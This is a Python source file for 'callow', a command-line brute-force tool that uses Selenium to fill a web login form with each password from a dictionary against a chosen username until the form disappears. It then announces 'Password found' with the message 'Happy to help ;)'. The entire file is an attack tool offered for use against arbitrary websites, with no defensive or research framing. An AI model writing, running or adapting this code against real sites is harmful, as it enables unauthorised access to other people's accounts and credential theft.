import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException


# Graphics
class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE = '\33[37m'


# Config
parser = OptionParser()
now = datetime.datetime.now()


# Arguments
parser.add_option("--site", dest="website", help="Target website (http/https only)")
parser.add_option("--usel", dest="usel", help="Username input selector")
parser.add_option("--psel", dest="psel", help="Password input selector")
parser.add_option("--lsel", dest="lsel", help="Submit button selector")
parser.add_option("--user", dest="username", help="Target username to attack")
parser.add_option("--pass", dest="passlist", help="Password dictionary")
(options, args) = parser.parse_args()


# ASCII banner for callow
banner = color.BOLD + color.RED + '''
   ____      _ _
  / ___|__ _| | | _____      __
 | |   / _` | | |/ _ \\ \ /\\ / /
 | |__| (_| | | | (_) \\ V  V /
  \\____\\__,_|_|_|\\___/ \\_/\\_/

  {0}[{1}-{2}] {3}v1.0
  {4}[{5}-{6}] {7}by Maximous Black (@maximousblk)
  {8}[{9}-{10}] {11}brute-force tool
'''.format(color.RED, color.CWHITE, color.RED, color.GREEN, color.RED, color.CWHITE, color.RED, color.GREEN, color.RED, color.CWHITE, color.RED, color.GREEN)


# Wizard that is presented if executed without any arguments
def wizard():
    print(banner)
    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Target website: ')
    sys.stdout.write(color.GREEN + '[#] ' + color.CWHITE + 'Checking if site is accessible '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print((color.GREEN + '[OK]\n'+color.CWHITE))
            sys.stdout.flush()
        elif request.status_code == 404:
            print((color.RED + '[X]' + '\n[!]'+color.CWHITE + ' Page not found. Make sure you entered the correct URL.\n[#] Status code: ' + request.status_code))
            sys.stdout.flush()
            exit()
        else:
            print((color.RED + '[X]' + '\n[!]'+color.CWHITE + ' Website could not be accessed for unknown reason. Make sure you use http/https only.\n[#] Status code: ' + request.status_code))
            sys.stdout.flush()
            exit()
    except KeyboardInterrupt:
        print((color.RED + '\n[!]'+color.CWHITE + 'Process terminated by user \n[#] Exiting...'))
        sys.stdout.flush()
        exit()
    except:
        t.sleep(1)
        print((color.RED + '\n[!]'+color.CWHITE + ' Unexpected error occured.'))
        sys.stdout.flush()
        exit()

    try:
        username_selector = input( color.GREEN + '[~] ' + color.CWHITE + 'Username input selector: ')
        password_selector = input( color.GREEN + '[~] ' + color.CWHITE + 'Password input selector: ')
        submit_selector = input( color.GREEN + '[~] ' + color.CWHITE + 'Login button selector: ')
        username = input( color.GREEN + '[~] ' + color.CWHITE + 'Target username: ')
        pass_list = input( color.GREEN + '[~] ' + color.CWHITE + 'Password dictionary: ')
        brutes(username, username_selector, password_selector, submit_selector, pass_list, website)
    except KeyboardInterrupt:
        print((color.RED + '\n[!]'+color.CWHITE + 'Process terminaed by user \n[#] Exiting...'))
        sys.stdout.flush()
        exit()
    except selenium.common.exceptions.NoSuchElementException:
        print((color.RED + '\n[!]'+color.CWHITE + ' Selectors not found. Make sure the selectors are entered correctly.'))
        sys.stdout.flush()
        exit()


def brutes(username, username_selector, password_selector, submit_selector, pass_list, website):
    try:
        f = open(pass_list, 'r')
    except FileNotFoundError:
        print((color.RED + '\n[!]'+color.CWHITE + ' Password list not found: ' + pass_list))
        sys.stdout.flush()
        exit()
    options = webdriver.ChromeOptions()
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-extensions")
    count = 1 # count
    browser = webdriver.Chrome('./chromedriver.exe')
    browser.get(website)
    t.sleep(2)
    try:
        Sel_user = browser.find_element_by_css_selector(username_selector) # Finds Selector
    except selenium.common.exceptions.NoSuchElementException:
        print((color.RED + '\n[!]'+ color.CWHITE + ' Username feild selector is invalid.'))
        sys.stdout.flush()
        exit()
    try:
        Sel_pas = browser.find_element_by_css_selector(password_selector) # Finds Selector
    except selenium.common.exceptions.NoSuchElementException:
        print((color.RED + '\n[!]'+ color.CWHITE + ' Password feild selector is invalid.'))
        sys.stdout.flush()
        exit()
    try:
        enter = browser.find_element_by_css_selector(submit_selector) # Finds Selector
    except selenium.common.exceptions.NoSuchElementException:
        print((color.RED + '\n[!]'+ color.CWHITE + ' Login button selector is invalid.'))
        sys.stdout.flush()
        exit()
    print((color.GREEN + '\nTarget user: ' + color.RED + username + color.CWHITE + '\n\n'))
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(2)
                Sel_user = browser.find_element_by_css_selector(username_selector) # Finds Selector
                Sel_pas = browser.find_element_by_css_selector(password_selector) # Finds Selector
                enter = browser.find_element_by_css_selector(submit_selector) # Finds Selector
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                t.sleep(5)
                print((color.GREEN + 'Tried password: ' + color.RED + line + color.CWHITE))
                temp = line
        except KeyboardInterrupt: # returns to main menu if ctrl C is used
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print(color.GREEN + '[#]' + color.CWHITE + ' Password found: ' + color.DARKCYAN + '{0}'.format(temp))
            print(color.YELLOW + 'Happy to help ;)' + color.CWHITE)
            exit()

if options.website == None:
    if options.usel == None:
        if options.psel == None:
            if options.lsel == None:
                if options.username == None:
                    if options.passlist == None:
                        wizard()


website = options.website
username_selector = options.usel
password_selector = options.psel
submit_selector = options.lsel
username = options.username
pass_list = options.passlist
print(banner)
brutes(username, username_selector, password_selector, submit_selector, pass_list, website)
